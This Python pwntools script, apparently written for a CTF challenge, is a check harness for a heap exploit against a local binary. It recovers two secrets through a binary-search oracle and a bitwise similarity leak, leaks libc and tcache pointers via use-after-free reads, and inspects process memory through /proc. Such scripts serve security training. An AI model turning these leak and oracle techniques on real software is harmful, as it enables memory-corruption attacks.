#!/usr/bin/env python3
"""Cheap checks: seal oracle, UAF libc leak, tcache heap key, compact null byte."""
import os
from pwn import *

context.arch = "amd64"
context.log_level = "info"

WORK = "/home/sira/Documents/CTF/Lancang_Mekong_CTF_comp/solved/pwn_the_last_flush/work"
LD = f"{WORK}/ld-linux-x86-64.so.2"
LIBC = f"{WORK}/libc.so.6"
BIN = f"{WORK}/chal"


def start():
    return process([LD, "--library-path", WORK, BIN])


def menu(p):
    p.recvuntil(b"archive> ")


def seal_search(p):
    lo, hi = 0, (1 << 64) - 1
    for _ in range(70):
        mid = (lo + hi) // 2
        menu(p)
        p.sendline(f"SEAL {mid:016x}".encode())
        line = p.recvline().strip()
        log.info("seal %016x -> %s", mid, line)
        if line.startswith(b"sealed"):
            return mid
        if line.startswith(b"higher"):
            lo = mid + 1
        elif line.startswith(b"lower"):
            hi = mid - 1
        else:
            raise RuntimeError(line)
        if lo > hi:
            break
    raise RuntimeError(f"seal failed lo={lo:#x} hi={hi:#x}")


def probe_secret(p):
    def once(val):
        menu(p)
        p.sendline(f"PROBE {val:016x}".encode())
        line = p.recvline().strip()
        # similarity N (budget M left)
        n = int(line.split()[1])
        return n

    base = once(0)
    secret = 0
    for i in range(64):
        s = once(1 << i)
        if s > base:
            secret |= 1 << i
    # verify
    menu(p)
    p.sendline(f"PROBE {secret:016x}".encode())
    line = p.recvline().strip()
    log.info("probe verify %s secret %016x base %d", line, secret, base)
    return secret


def hx(b):
    return b.hex()


def store(p, n, data: bytes):
    assert len(data) == n
    menu(p)
    p.sendline(f"STORE {n} {hx(data)}".encode())
    line = p.recvline().strip()
    log.info("store %s", line)
    return line


def review(p, i, off, n):
    menu(p)
    p.sendline(f"REVIEW {i} {off} {n}".encode())
    line = p.recvline().strip()
    return bytes.fromhex(line.decode())


def drop(p, i):
    menu(p)
    p.sendline(f"DROP {i}".encode())
    log.info("drop %s", p.recvline().strip())


def compact(p, i):
    menu(p)
    p.sendline(f"COMPACT {i}".encode())
    log.info("compact %s", p.recvline().strip())


def main():
    p = start()
    log.info("pid %d", p.pid)
    secret2 = seal_search(p)
    secret1 = probe_secret(p)
    log.success("s1=%#x s2=%#x", secret1, secret2)

    # H1: large chunk UAF -> unsorted libc pointers. Guard so it doesn't merge with top.
    victim_sz = 0x4F8
    guard_sz = 0x258
    store(p, victim_sz, b"V" * victim_sz)  # id 0
    store(p, guard_sz, b"G" * guard_sz)    # id 1
    drop(p, 0)
    leak = review(p, 0, 0, 16)
    log.success("unsorted leak %s", leak.hex())
    fd, bk = u64(leak[:8]), u64(leak[8:])
    log.success("fd %#x bk %#x", fd, bk)

    maps = open(f"/proc/{p.pid}/maps").read()
    libc_base = None
    heap_base = None
    for line in maps.splitlines():
        if "libc.so.6" in line and libc_base is None:
            libc_base = int(line.split("-")[0], 16)
        if "[heap]" in line and heap_base is None:
            heap_base = int(line.split("-")[0], 16)
    log.info("libc base %#x heap %#x", libc_base, heap_base)
    log.info("fd-libc %#x bk-libc %#x", fd - libc_base, bk - libc_base)

    # H2: tcache UAF leaks (addr >> 12)
    store(p, guard_sz, b"T" * guard_sz)  # id 2
    store(p, guard_sz, b"U" * guard_sz)  # id 3 guard
    drop(p, 2)
    tleak = review(p, 2, 0, 8)
    key = u64(tleak)
    log.success("tcache fd %#x  (<<12 = %#x)", key, key << 12)

    # pie / globals
    pie = None
    for line in maps.splitlines():
        if "chal" in line and "r--" in line:
            pie = int(line.split("-")[0], 16)
            break
    if pie is None:
        for line in maps.splitlines():
            if line.endswith("chal") or "/chal" in line:
                pie = int(line.split("-")[0], 16)
                break
    log.info("pie %#x", pie or 0)
    if pie:
        mem = open(f"/proc/{p.pid}/mem", "rb")
        def rq(off, n):
            mem.seek(pie + off)
            return mem.read(n)
        s1m = u64(rq(0x52E0, 8))
        s2m = u64(rq(0x52E8, 8))
        hfd = u64(rq(0x52F8, 8))
        flagfd = u32(rq(0x5018, 4))
        log.success("mem s1 %#x s2 %#x heapfd %#x flagfd %d", s1m, s2m, hfd, flagfd)
        log.info("heapfd-libc %#x", hfd - libc_base)
        mem.close()

    p.close()


if __name__ == "__main__":
    main()
